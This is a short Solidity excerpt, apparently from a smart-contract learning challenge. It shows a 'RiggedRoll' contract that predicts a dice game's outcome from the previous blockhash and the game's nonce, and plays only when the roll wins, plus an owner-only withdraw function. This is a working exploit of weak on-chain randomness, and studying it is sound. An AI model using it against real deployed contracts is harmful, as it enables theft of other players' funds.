...
contract RiggedRoll is Ownable {
 ...
 function withdraw(address payable _to, uint amount) public  onlyOwner  {
         require(address(this).balance >= amount, "Not enough in contract");
        _to.transfer(amount);
...
function riggedRoll() public payable {
        require(address(this).balance >= .002 ether, "Need at least .002 ether to play");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
         emit rolledTheDice(roll);
        console.log(roll);
        require(roll <= 2, "Can't roll if roll is greater than 2");
